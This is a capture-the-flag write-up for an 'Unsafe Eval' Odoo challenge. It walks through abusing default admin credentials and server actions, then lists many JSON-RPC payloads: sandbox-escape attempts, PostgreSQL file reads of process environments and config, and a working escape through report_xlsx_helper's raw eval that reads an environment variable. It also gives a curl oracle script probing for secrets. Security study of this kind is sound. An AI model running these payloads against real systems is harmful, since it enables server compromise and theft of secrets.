---
title: "Unsafe Eval"

difficulty: Hard
description: "A mid-sized company recently spun up an Odoo Community Edition instance to manage their growing operations. In the rush to get things running, the IT team never bothered changing the default credentials, admin/admin still works just fine. You've been brought in as a penetration tester. Your client suspects the exposure goes beyond just unauthorized access to business data. They want to know: can someone with admin access to this Odoo instance pivot deeper into the underlying server? Your objective is to extract a super-secret environment variable called FLAG from the host system."
flag: "(flag obtained, text not recorded)"
---

> *A mid-sized company recently spun up an Odoo Community Edition instance to manage their growing operations. In the rush to get things running, the IT team never bothered changing the default credentials, admin/admin still works just fine. You've been brought in as a penetration tester. Your client suspects the exposure goes beyond just unauthorized access to business data. They want to know: can someone with admin access to this Odoo instance pivot deeper into the underlying server? Your objective is to extract a super-secret environment variable called FLAG from the host system.*


## initial recon

poked around the web UI first. Settings > Technical > Server Actions caught my eye, Odoo lets admins create "automated actions" that run Python code server-side through a sandbox called `safe_eval`. 

checking what modules are installed using its api: [JSON-RPC API](https://www.odoo.com/documentation/17.0/developer/reference/external_api.html). 

```json
{
  "jsonrpc": "2.0",
  "method": "call",
  "params": {
    "model": "ir.module.module",
    "method": "search_read",
    "args": [[["state", "=", "installed"]]],
    "kwargs": {"fields": ["name", "shortdesc", "author"], "limit": 100}
  }
}
```

found `autoinstaller`, and the standard Odoo suite.

created a test server action via JSON-RPC to `/web/dataset/call_kw/ir.actions.server/create`:

```json
{
  "jsonrpc": "2.0",
  "method": "call",
  "params": {
    "model": "ir.actions.server",
    "method": "create",
    "args": [{"name": "test", "model_id": 86, "state": "code",
              "code": "raise Warning('test123')"}],
    "kwargs": {}
  }
}
```

that worked. `raise UserError(...)` is the error exfiltration channel: the error message comes back in the JSON-RPC response body. so the plan is: escape `safe_eval`, read `os.environ['FLAG']`, shove it into a `UserError`.

## everything that didn't work

**attempt 1: PostgreSQL `pg_read_file`**. SQL execution works through `env.cr.execute()`, so i tried reading `/proc/1/environ` directly from PostgreSQL:

```json
"code": "env.cr.execute(\"SELECT pg_read_file('/proc/1/environ')\")\nraise UserError(env.cr.fetchone()[0])"
```

got environment variables back, but they were the PostgreSQL container's env, not Odoo's. no FLAG there. tried `pg_read_binary_file` with null byte splitting too:

```json
"code": "env.cr.execute(\"SELECT replace(encode(pg_read_binary_file('/proc/1/environ'),'escape')::text, '\\\\000', E'\\n')\")\nraise UserError(env.cr.fetchone()[0])"
```

same problem. PostgreSQL is in a separate container, so `/proc/1/environ` is postgres's PID 1, not odoo's.

**attempt 2: MRO traversal**. the standard `().__class__.__mro__[1].__subclasses__()` -> `catch_warnings` -> `__init__.__globals__['sys']` -> `os.environ` chain:

```json
"code": "c=[x for x in ().__class__.__mro__[1].__subclasses__() if x.__name__=='catch_warnings'][0]\nraise UserError(c.__init__.__globals__['sys'].modules['os'].environ.get('FLAG', 'x'))"
```

blocked. `safe_eval` strips `__` attribute access at the AST level.

**attempt 3: `getattr` chain**. tried breaking the double-underscore access into `getattr()` calls:

```json
"code": "a=getattr((),'__class__')\nb=getattr(a,'__mro__')[1]\nc=getattr(b,'__subclasses__')()\nd=[x for x in c if getattr(x,'__name__')=='catch_warnings'][0]\ne=getattr(getattr(d,'__init__'),'__globals__')\nraise UserError(e['sys'].modules['os'].environ.get('FLAG', 'x'))"
```

still blocked. `safe_eval` intercepts `getattr` on dunder attributes too.

**attempt 4: module attribute chains**. `dateutil.tz.os.environ`. some Odoo safe_eval contexts expose `dateutil`:

```json
"code": "raise UserError(dateutil.tz.os.environ.get('FLAG', 'x'))"
```

blocked. attribute chains through to `os` are sanitized.

**attempt 5: `import` statement**:

```json
"code": "import odoo\nraise UserError(str(odoo.tools.config['addons_path']))"
```

blocked. `import` is not allowed in safe_eval at all. though this would have been a different thing anyway, just config, not env.

at this point i'd burned through maybe 15 payloads

## digging through the database

since SQL worked fine even if `safe_eval` was locked down, i started querying the database for clues. used `env.cr.execute` to poke around:

```json
"code": "env.cr.execute(\"SELECT pg_ls_dir('/usr/lib/python3/dist-packages/odoo/addons/autoinstaller')\")\nraise UserError(str(env.cr.fetchall()))"
```

```json
"code": "env.cr.execute(\"SELECT name,icon,website,url,summary,description FROM ir_module_module WHERE name='autoinstaller'\")\nr1=str(env.cr.fetchall())\nraise UserError(r1)"
```

looked at the `autoinstaller` module's dependencies. read the odoo config:

```json
"code": "env.cr.execute(\"SELECT value FROM ir_config_parameter WHERE key='addons_path' OR key='base_addons_path'\")\nr1=str(env.cr.fetchall())\nenv.cr.execute(\"SELECT pg_read_file('/etc/odoo/odoo.conf')\")\nr2=str(env.cr.fetchone())\nraise UserError(r1+'\\n|||\\n'+r2)"
```

dumped all config parameters, looked for anything flag-related in the KPI tables, checked `sale_workflow_process`, dumped non-standard table names. all dead ends. the flag wasn't in the database.

then i looked for xlsx report modules and found something interesting:

```json
"code": "env.cr.execute(\"SELECT report_name,report_type,model FROM ir_act_report_xml WHERE report_type='xlsx'\")\nr1=str(env.cr.fetchall())\nenv.cr.execute(\"SELECT key,value FROM ir_config_parameter WHERE key NOT LIKE 'database%'\")\nr2=str(env.cr.fetchall())\nraise UserError(r1+'\\n|||\\n'+r2)"
```

found `report.report_xlsx_helper.test_partner_xlsx`. i also searched for qweb templates with `eval` in them:

```json
"code": "env.cr.execute(\"SELECT arch_db FROM ir_ui_view WHERE arch_db::text LIKE '%eval%' AND type='qweb' LIMIT 10\")\nr1=str(env.cr.fetchall())\nraise UserError(r1)"
```

and then it clicked. i searched github for `report_xlsx_helper` + `eval` and found the source: [OCA/reporting-engine `report_xlsx_abstract.py` line 691](https://github.com/OCA/reporting-engine/blob/35a9cd5f28d245857269952ac39a10cfdd89d98a/report_xlsx_helper/report/report_xlsx_abstract.py#L691). the `report_xlsx_helper` module has `_render()` and `_eval()` methods that use raw Python `eval()` instead of Odoo's `safe_eval`. the helper is meant to evaluate cell formulas for spreadsheet generation. it never expected to be called with attacker-controlled input.

so here's the thing: `safe_eval` prevents you from calling `__import__` or accessing `os` directly, but it doesn't prevent you from calling methods on Odoo model objects that internally use raw `eval()`. the sandbox only applies to the top-level code execution, not to what happens inside method calls.

## the payload 

```json
{
  "jsonrpc": "2.0",
  "method": "call",
  "params": {
    "model": "ir.actions.server",
    "method": "create",
    "args": [{
      "name": "x",
      "model_id": 86,
      "state": "code",
      "code": "r=env['report.report_xlsx_helper.test_partner_xlsx']\ncode=r._render(\"__import__('os').environ.get('FLAG', 'x')\")\nresult=r._eval(code,{})\nraise UserError(str(result))"
    }],
    "kwargs": {}
  }
}
```

`_render()` wraps the expression into an eval-compatible form. `_eval()` calls raw `eval()` on it. the result goes into `UserError` for exfiltration back through the JSON-RPC response.

## execution

two JSON-RPC calls. first one creates the server action (sent the payload above to `/web/dataset/call_kw/ir.actions.server/create`). response came back with the new action ID, 476.

then trigger it with run.json:

```json
{
  "jsonrpc": "2.0",
  "method": "call",
  "params": {
    "model": "ir.actions.server",
    "method": "run",
    "args": [[476]],
    "kwargs": {}
  }
}
```

sent that to `/web/dataset/call_kw/ir.actions.server/run`. the JSON-RPC error response contained the FLAG value from `os.environ`.

also investigated [CVE-2024-36259](https://nvd.nist.gov/vuln/detail/CVE-2024-36259) (improper access control in Odoo's mail module, oracle-based info leak via `mail.message` search queries) as a possible angle. wrote a probe script:

```bash
oracle() {
    local domain="$1"
    local label="$2"
    local result
    result=$(curl -s -b "$COOKIE" -H "Content-Type: application/json" \
        "$TARGET/web/dataset/call_kw/mail.message/search_count" \
        --data-raw "{\"jsonrpc\":\"2.0\",\"method\":\"call\",\"params\":{\"model\":\"mail.message\",\"method\":\"search_count\",\"args\":[[$domain]],\"kwargs\":{}}}")
    echo "[$label] $result"
}

for keyword in "flag" "CSC" "CSCBE" "password" "secret" "key" "admin" "token"; do
    oracle "[\"body\",\"ilike\",\"$keyword\"]" "body~$keyword"
done
```

but the flag wasn't in the database at all, it was in the environment variables, so the mail oracle wouldn't have helped here even if the CVE was exploitable on this instance.

the whole solve path:  server actions for code exec -> safe_eval sandbox blocked all direct approaches -> found `report_xlsx_helper` uses raw `eval()` internally -> called through to it from safe_eval context -> read `os.environ['FLAG']` -> exfiltrated via `UserError`.

